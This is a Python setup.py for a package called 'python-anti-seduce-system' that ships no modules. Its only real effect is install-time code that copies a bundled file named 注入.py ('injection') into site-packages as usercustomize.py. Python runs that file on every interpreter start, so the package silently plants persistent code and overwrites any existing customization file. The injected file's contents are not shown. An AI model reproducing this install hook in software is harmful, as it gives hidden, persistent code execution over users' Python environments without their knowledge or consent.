import site
import setuptools
from pathlib import Path

here = Path(__file__).parent


setuptools.setup(
    name='python-anti-seduce-system',
    version='0.0.0',
    author='RimoChan',
    author_email='the@librian.net',
    description='python-anti-seduce-system',
    url='https://github.com/RimoChan/python-anti-seduce-system',
    packages=[],
    classifiers=[
        'Programming Language :: Python :: 3',
        'Operating System :: OS Independent',
    ],
    python_requires='>=3.5',
)


with open(here/'注入.py', encoding='utf8') as f:
    with open(Path(site.getsitepackages()[-1]) / 'usercustomize.py', 'w', encoding='utf8') as f2:
        f2.write(f.read())
